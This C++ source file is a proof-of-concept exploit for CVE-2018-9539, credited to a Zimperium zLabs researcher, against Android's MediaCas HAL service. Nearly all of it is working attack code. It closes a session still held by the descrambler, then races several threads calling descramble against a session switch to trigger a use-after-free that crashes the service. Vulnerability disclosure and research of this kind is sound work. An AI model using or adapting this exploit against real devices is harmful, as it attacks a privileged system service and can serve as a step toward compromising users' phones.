//
// CVE-2018-9539 proof-of-concept
// Author: Tamir Zahavi-Brunner (@tamir_zb) of Zimperium zLabs Team
//


#include <utils/StrongPointer.h>
#include <binder/MemoryHeapBase.h>
#include <android/hardware/cas/1.0/IMediaCasService.h>
#include <android/hardware/cas/1.0/ICas.h>
#include <android/hardware/cas/native/1.0/IDescrambler.h>

#include <stdio.h>

using ::android::sp;
using ::android::MemoryHeapBase;
using ::android::hardware::hidl_vec;
using ::android::hardware::hidl_memory;
using ::android::hardware::hidl_handle;
using ::android::hardware::hidl_string;
using ::android::hardware::Return;
using namespace android::hardware::cas::V1_0;
using namespace android::hardware::cas::native::V1_0;

#define CHECK(condition) \
    if (!(condition)) { \
        fprintf(stderr, "Check failed:\n\t" #condition "\n\tLine: %d\n", __LINE__); \
        return -1; \
    }

#define CLEARKEY_SYSTEMID (0xF6D8)

#define THREADS_NUM (5)

typedef enum {
    RESULT_CRASH,
    RESULT_SESSION1,
    RESULT_SESSION2,
} thread_result_t;

// Taken from cts/tests/tests/media/src/android/media/cts/MediaCasTest.java
static const char *provision_str =
    "{                                                   "
    "  \"id\": 21140844,                                 "
    "  \"name\": \"Test Title\",                         "
    "  \"lowercase_organization_name\": \"Android\",     "
    "  \"asset_key\": {                                  "
    "  \"encryption_key\": \"nezAr3CHFrmBR9R8Tedotw==\"  "
    "  },                                                "
    "  \"cas_type\": 1,                                  "
    "  \"track_types\": [ ]                              "
    "}                                                   ";
static const uint8_t ecm_buffer[] = {
    0x00, 0x00, 0x01, 0xf0, 0x00, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x46, 0x00,
    0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x27, 0x10, 0x02, 0x00,
    0x01, 0x77, 0x01, 0x42, 0x95, 0x6c, 0x0e, 0xe3, 0x91, 0xbc, 0xfd, 0x05, 0xb1, 0x60, 0x4f,
    0x17, 0x82, 0xa4, 0x86, 0x9b, 0x23, 0x56, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x27, 0x10, 0x02, 0x00, 0x01, 0x77, 0x01, 0x42, 0x95, 0x6c, 0xd7, 0x43, 0x62, 0xf8, 0x1c,
    0x62, 0x19, 0x05, 0xc7, 0x3a, 0x42, 0xcd, 0xfd, 0xd9, 0x13, 0x48,
};


static sp<IDescrambler> descrambler;
static pthread_barrier_t barrier;


static void *thread_func(void *) {
    // Prepare everything needed for an encrypted run of descramble

    sp<MemoryHeapBase> heap = new MemoryHeapBase(0x1000);

    native_handle_t* handle = native_handle_create(1, 0);
    handle->data[0] = heap->getHeapID();

    SharedBuffer src;
    src.offset = 0;
    src.size = 0x1000;
    src.heapBase = hidl_memory("ashmem", hidl_handle(handle), heap->getSize());

    DestinationBuffer dst;
    dst.type = BufferType::SHARED_MEMORY;
    dst.nonsecureMemory = src;

    hidl_vec<SubSample> subsamples;
    SubSample subsample_arr[0x100] = {{ .numBytesOfClearData = 0,
        .numBytesOfEncryptedData = 0x10 }};
    subsamples.setToExternal(subsample_arr, 0x100);

    Status descramble_status;


    // Wait for all other threads
    pthread_barrier_wait(&barrier);


    // Run descramble
    Return<void> descramble_result = descrambler->descramble(
            ScramblingControl::EVENKEY, subsamples, src, 0, dst, 0,
            [&] (Status status, uint32_t, const hidl_string&) {
                descramble_status = status;
            });


    // Cleanup
    native_handle_delete(handle);


    if (!descramble_result.isOk()) {
        // Service crashed, hurray!
        return (void *)RESULT_CRASH;
    }

    // If descramble was successful then the session had a valid key, so it was session1.
    // Otherwise it was session2.
    return (void *)(descramble_status == Status::OK ? RESULT_SESSION1 : RESULT_SESSION2);
}

int main() {
    // Prepare cas & descrambler objects

    sp<IMediaCasService> service = IMediaCasService::getService();
    CHECK(service != NULL);

    sp<ICas> cas = service->createPlugin(CLEARKEY_SYSTEMID, NULL);
    CHECK(cas->provision(provision_str) == Status::OK)

    sp<IDescramblerBase> descramblerBase = service->createDescrambler(CLEARKEY_SYSTEMID);
    descrambler = IDescrambler::castFrom(descramblerBase);

    printf("Objects prepared\n");

    for (size_t attempt = 1; true; attempt++) {
        printf("\nAttempt #%zu:\n", attempt);

        // Prepare sessions

        Status opensession_status;
        hidl_vec<uint8_t> session1;
        cas->openSession([&](Status status, const hidl_vec<uint8_t>& sessionId) {
                opensession_status = status;
                session1 = sessionId;
                });
        CHECK(opensession_status == Status::OK);
        // Add a key to the first session. This will make descramble work only on the first
        // session, helping us differentiate between the sessions for debugging.
        hidl_vec<uint8_t> ecm;
        ecm.setToExternal((uint8_t *)ecm_buffer, sizeof(ecm_buffer));
        CHECK(cas->processEcm(session1, ecm) == Status::OK);

        hidl_vec<uint8_t> session2;
        cas->openSession([&](Status status, const hidl_vec<uint8_t>& sessionId) {
                opensession_status = status;
                session2 = sessionId;
                });
        CHECK(opensession_status == Status::OK);

        printf("Sessions prepared\n");


        // Set the descrambler session to session1, then close it (and remove it from the
        // sessions map). This way the only reference on the service to session1 will be from
        // descrambler's session.
        CHECK(descrambler->setMediaCasSession(session1) == Status::OK);
        CHECK(cas->closeSession(session1) == Status::OK);
        printf("Descrambler session set to session1\n");


        // Prepare the threads which run descramble
        CHECK(pthread_barrier_init(&barrier, NULL, THREADS_NUM + 1) == 0);
        pthread_t threads[THREADS_NUM];
        for (size_t i = 0; i < THREADS_NUM; i++) {
            CHECK(pthread_create(threads + i, NULL, thread_func, NULL) == 0);
        }
        printf("Threads prepared\n");


        // Let the threads run by waiting on the barrier. This means that past this point all
        // threads will run descramble.
        printf("Running threads...\n");
        pthread_barrier_wait(&barrier);


        // While the threads are running descramble, change the descrambler session to session2.
        // Hopefully this will cause a use-after-free through a race condition; session1's
        // reference count will drop to 0 so it will be released, but one thread will still run
        // descramble on the released session.
        CHECK(descrambler->setMediaCasSession(session2) == Status::OK);
        printf("Descrambler session set to session2\n");


        // Go over thread results
        for (size_t i = 0; i < THREADS_NUM; i++) {
            thread_result_t thread_result;
            CHECK(pthread_join(threads[i], (void **)&thread_result) == 0);
            printf("Thread #%zu result: ", i);
            if (thread_result == RESULT_CRASH) {
                printf("CRASHED :)\n\nSucceeded in %zu attempts\n", attempt);
                return 0;
            }
            printf(thread_result == RESULT_SESSION1 ? "session1\n" : "session2\n");
        }

        // Cleanup
        CHECK(cas->closeSession(session2) == Status::OK);
        CHECK(pthread_barrier_destroy(&barrier) == 0);

        printf("Attempt #%zu failed, retrying...\n", attempt);
    }
}
